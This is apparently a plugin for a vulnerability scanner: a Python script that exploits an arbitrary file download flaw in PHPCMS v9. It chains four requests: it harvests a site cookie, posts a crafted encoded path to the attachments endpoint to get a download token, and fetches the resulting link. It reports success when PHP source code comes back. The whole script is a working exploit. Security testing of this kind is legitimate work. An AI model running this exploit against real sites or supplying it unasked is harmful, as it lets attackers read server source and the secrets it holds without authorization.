#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import re
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    phpcms v9 download
    """
    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4"}
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url, ['./phpcms/', './']):
                    url1 = path +"index.php?m=wap&c=index&a=init&siteid=1"
                    async with session.get(url=url1, headers = headers) as res1:
                        if res1:
                            for cookie in res1.cookies:
                                if '_siteid' == cookie:
                                    userid = cookie.value
                                    url2 = path +"/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp"
                                    _data1 = {'userid_flash': userid}
                                    async with session.post(url=url2, data=_data1,headers = headers) as res2:
                                        if res2 != None:
                                            for cookie in res2.cookies:
                                                if '_att_json' ==  cookie:
                                                    att_json = cookie.value
                                                    url3 = path +"/index.php?m=content&c=down&a=init&a_k=" + att_json
                                                    async with session.get(url=url3,headers = headers) as res3:
                                                        if res3 !=None:
                                                            text3 = await res3.text()
                                                            file = re.findall(r'<a href="(.+?)"', text3)[0]
                                                            url4 = path + '/index.php' + file
                                                            async with session.get(url=url4,headers = headers) as res4:
                                                                if res4 !=None:
                                                                    text4 = await res4.text()
                                                                    if '<?php' in text4:
                                                                        yield url4
                                                                        return
